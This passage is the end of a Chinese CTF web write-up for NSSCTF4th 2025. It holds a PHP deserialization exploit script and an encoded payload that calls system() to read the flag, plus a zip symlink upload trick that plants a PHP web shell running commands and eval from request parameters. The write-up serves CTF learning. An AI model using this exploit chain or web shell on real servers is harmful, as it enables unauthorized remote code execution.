+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><code>processedContent = new FunctionInvoker();</code> 赋值为 FunctionInvoker 实例化对象，然后让 callbackFunction、cmd 为需要的函数和参数即可，这里使用 system 进行 RCE</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FunctionInvoker</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="err">$</span><span class="n">functionName</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="err">$</span><span class="n">functionArguments</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__call</span><span class="p">(</span><span class="err">$</span><span class="n">name</span><span class="p">,</span> <span class="err">$</span><span class="n">arg</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">function_exists</span><span class="p">(</span><span class="err">$</span><span class="n">name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">$</span><span class="n">name</span><span class="p">(</span><span class="err">$</span><span class="n">arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>利用链</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">ApplicationContext::__destruct()
+</span></span><span class="line"><span class="cl">	FileManager::__toString()
+</span></span><span class="line"><span class="cl">		FileManager::performWriteOperation()
+</span></span><span class="line"><span class="cl">			ContentProcessor::__get()
+</span></span><span class="line"><span class="cl">				FunctionInvoker::__call()</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>exp</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ApplicationContext</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$contextName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$contextName</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">contextName</span> <span class="o">=</span> <span class="nv">$contextName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ContentProcessor</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$processedContent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$callbackFunction</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$callbackFunction</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callbackFunction</span> <span class="o">=</span> <span class="nv">$callbackFunction</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">processedContent</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FunctionInvoker</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileManager</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$targetFile</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$responseData</span> <span class="o">=</span> <span class="s1">&#39;default_response&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$targetFile</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span> <span class="o">=</span> <span class="nv">$targetFile</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">performWriteOperation</span><span class="p">(</span><span class="nv">$var</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$targetObject</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$targetObject</span><span class="o">-&gt;</span><span class="nv">$var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FunctionInvoker</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$name</span><span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ContentProcessor</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$f</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileManager</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$d</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ApplicationContext</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$payload</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>Payload</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/?action=home
+</span></span><span class="line"><span class="cl">POST:
+</span></span><span class="line"><span class="cl">file_to_check=O%3A18%3A%22ApplicationContext%22%3A1%3A%7Bs%3A11%3A%22contextName%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A0%3A%7B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D%7D
+</span></span><span class="line"><span class="cl">&amp;submit_md5=&amp;method=performWriteOperation&amp;var=processedContent&amp;cmd=cat /flag</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250824162752166.png" alt="" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="ez_upload"><span>ez_upload</span>
+  <a href="#ez_upload" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>PHP &lt;= 7.4.21 development server 源码泄露漏洞，题目就是 index.php 写的上传功能，只是没回显，读取源码
+<figure>
+  <img src="file-20250824162819076.png" alt="" loading="lazy"></figure>
+
+解压操作，直接打软链接</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">ln -s /var/www/html link
+</span></span><span class="line"><span class="cl">zip -y -r 1.zip link
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">rm -f link; mkdir -p link
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat &gt; link/shell.php &lt;&lt;&#39;PHP&#39;
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">if (isset($_GET[&#39;cmd&#39;])) { system($_GET[&#39;cmd&#39;]); }
+</span></span><span class="line"><span class="cl">elseif (isset($_POST[&#39;a&#39;])) { @eval($_POST[&#39;a&#39;]); }
+</span></span><span class="line"><span class="cl">elseif (isset($_GET[&#39;f&#39;])) { @readfile($_GET[&#39;f&#39;]); }
+</span></span><span class="line"><span class="cl">PHP
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">zip -r 2.zip link</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>依次上传 <code>1.zip、2.zip</code>，访问 <code>shell.php RCE</code>
+<figure>
+  <img src="image-20250824234635561.png" alt="image-20250824234635561" loading="lazy"></figure>
+</p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/ctf/" class="post-footer-tag-link" title="Tags - CTF">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>CTF</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/nssctf4th-2025-web-writeup/" data-title="NSSCTF4th 2025 Web Writeup" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="CTF"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/nssctf4th-2025-web-writeup/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/nssctf4th-2025-web-writeup/" data-title="NSSCTF4th 2025 Web Writeup"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/%E5%AE%81%E6%B3%A2%E8%B5%9B-2025-web-writeup/" class="post-footer-nav-prev" rel="prev">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">天一永安杯 2025 Web Writeup</div>
+          </div>
+        </a><a href="/posts/lilctf-2025-web-writeup/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">LILCTF 2025 Web Writeup</div>
+          </div>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#ez_signin"><code>ez_signin</code></a></li>
+        <li><a href="#ezcrc"><code>EzCRC</code></a></li>
+        <li><a href="#mpgafilesystem"><code>[mpga]filesystem</code></a></li>
+        <li><a href="#ez_upload">ez_upload</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/f2b25aabca7666b402dfc8ccfba68921.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
